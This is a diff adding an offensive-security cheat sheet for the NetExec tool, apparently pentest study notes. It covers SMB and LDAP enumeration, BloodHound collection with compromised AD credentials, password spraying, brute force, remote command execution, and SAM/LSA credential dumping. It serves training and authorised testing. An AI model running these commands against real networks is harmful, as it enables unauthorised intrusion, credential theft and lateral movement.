@@ -1,0 +1,86 @@
+Install:
+
+sudo apt install pipx git
+pipx ensurepath
+pipx install git+https://github.com/Pennyw0rth/NetExec
+
+
+I encourage you to do some research on what protocols NetExec supports!
+NETEXEC ENUMERATION (CLICKY)
+
+
+Enumerate Hosts:
+
+    Use to identify live hosts and their SMB details on a network.
+    nxc smb 192.168.1.0/24
+
+Enumerate Null Sessions:
+
+    Check if a host allows null sessions, which can be useful for further enumeration.
+    nxc smb 192.168.1.101 --null-session
+
+Enumerate Active Sessions:
+
+    List active SMB sessions on a target host.
+
+    nxc smb 192.168.1.0/24 --sessions
+
+Enumerate Shares and Access:
+
+    List all available shares and permissions.
+
+    nxc smb 192.168.1.0/24 -u Username -p 'PASSWORD' --shares
+
+Enumerate Domain Users:
+
+nxc smb 192.168.1.0/24 -u Username -p 'PASSWORD' --domain-users
+
+Retrieve domain users for further analysis.
+
+S1REN, I've compromised a machine on the internal network and managed to get a real AD User.
+What do?
+Glad you asked.
+
+Search for the Domain Controller first, enumerate it out by checking for LDAP protocol. Then, once firmly identified - utilize your compromised AD Creds along side NetExec with Bloodhound-Python.
+
+NetExec ldap <ip> -u ad-user -p ad-pass --bloodhound -ns <ns-ip> --collection All
+
+If successful - you will get a bunch of JSON output files that can be imported into the Bloodhound GUI.
+
+Additionally......
+
+# SMB Enumeration
+nxc smb <target> --shares
+nxc smb <target> --sessions
+nxc smb <target> --null-session
+nxc smb <target> --guest-logon
+nxc smb <target> --interfaces
+
+# LDAP Enumeration
+nxc ldap <target> --users
+nxc ldap <target> --subnet
+nxc ldap <target> --domain-trusts
+
+# Password Spraying (Supported protocols: SMB, WINRM, SSH, etc.)
+nxc <protocol> <target> -u <username> -p <password>
+nxc <protocol> <target> -u <file_with_users> -p <file_with_passwords> --no-bruteforce
+
+# Command Execution (Supported on protocols like SMB, WINRM, MSSQL, etc.)
+nxc <protocol> <target> --exec <command>
+
+# Dumping credentials
+nxc smb <target> --dump-sam
+nxc smb <target> --dump-lsa
+
+# Brute-force and Credential Checks
+nxc <protocol> <target> -u <username> -p <password> --continue-on-success
+nxc <protocol> <target> -u <file_with_users> -p <file_with_passwords> --no-bruteforce
+
+# Scan for vulnerabilities
+nxc smb <target> --vuln-scan
+
+# Additional Examples
+nxc smb <target> --domain-users
+nxc smb <target> --domain-password-policy
+nxc ldap <target> --find-sid
+nxc ldap <target> --check-signing
